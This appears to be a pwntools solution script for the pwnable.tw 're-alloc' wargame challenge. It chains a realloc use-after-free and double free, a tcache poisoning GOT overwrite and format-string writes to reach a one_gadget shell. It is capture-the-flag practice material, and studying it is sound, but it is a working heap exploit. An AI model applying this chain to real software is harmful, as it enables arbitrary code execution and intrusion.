#!/usr/bin/env python3

from pwn import *

exe = ELF("./re-alloc_patched")
libc = ELF("./libc-chall.so", checksec = False)
ld = ELF("./ld-2.29.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10106)

    return r


def alloc(index: int, size: int, data: bytes):
    r.sendlineafter(b"choice: ", b"1")
    r.sendlineafter(b"Index:", str(index).encode("ascii"))
    r.sendlineafter(b"Size:", str(size).encode("ascii"))
    r.sendafter(b"Data:", data)


def realloc(index: int, size: int, data: bytes):
    r.sendlineafter(b"choice: ", b"2")
    r.sendlineafter(b"Index:", str(index).encode("ascii"))
    r.sendlineafter(b"Size:", str(size).encode("ascii"))

    if size > 0:
        r.sendafter(b"Data:", data)


def free(index: int):
    r.sendlineafter(b"choice: ", b"3")
    r.sendlineafter(b"Index:", str(index).encode("ascii"))


def exit():
    r.sendlineafter(b"choice: ", b"4")


def leak_libc() -> int:
    r.sendlineafter(b"choice: ", b"1")
    r.sendlineafter(b"Index:", b"%3$lx")
    return int(r.recvline().strip(), 16)


def fmtstr_write(payload: bytes):
    r.sendlineafter(b"choice: ", b"1")
    r.sendafter(b"Index:", payload)


def main():
    r = conn()

    # UAF with `realloc()` function: if size = 0x0 it frees chunks
    # but function doesn't NULL the pointer in that case.
    # Also `strncat()` appends a NULL-char at the end of input, if the
    # input is exactly the given size, `strncat()` will overwrite the
    # next byte which is the size field of next chunk.

    # Double-Free and UAF to place same chunk in two different bins and change its fd pointer
    alloc(0, 0x48, b"A" * 0x10)
    realloc(0, 0x0,  b"")
    realloc(0, 0x68, b"B" * 0x10)   # Double-Free (and UAF but not useful now)
    free(0)

    alloc(0, 0x48, p64(exe.got.atoll))     # Overwrites fd pointer with `atoll()` GOT address
    alloc(1, 0x68, b"C" * 0x10)

    realloc(0, 0x48, b"D" * 0x10)
    free(0)
    alloc(0, 0x68, p64(exe.plt.printf))

    libc.address = leak_libc() - (libc.sym.__read_chk + 9)
    one_gadget = libc.address + 0xe21ce
    log.info(f"libc @ 0x{libc.address:x}")

    # NOTE: Now any call to `atoll()` is a call to `printf()`.
    # We can overwrite `_exit()` GOT with "one_gadget" address using format strings.

    # Place `_exit` GOT address into the stack (we will use the last $rbp saved as pointer
    # to that address; $rbp is the 31st argument while the address will be the 50th argument)
    payload = f"%{exe.got._exit}c%31$lln".encode("ascii")
    fmtstr_write(payload)

    for idx in range(6):

        # Overwrite GOT's `_exit()` with "one_gadget" address, byte by byte
        payload = f"%{(one_gadget >> (idx * 8)) & 0xFF}c%50$hhn".encode("ascii")
        fmtstr_write(payload)

        # Update address to next byte
        payload = f"%{(exe.got._exit & 0xFF) + idx + 1}c%31$hhn".encode("ascii")
        fmtstr_write(payload)

    exit()      # Trigger one_gadget
    r.interactive("$ ")


if __name__ == "__main__":
    main()
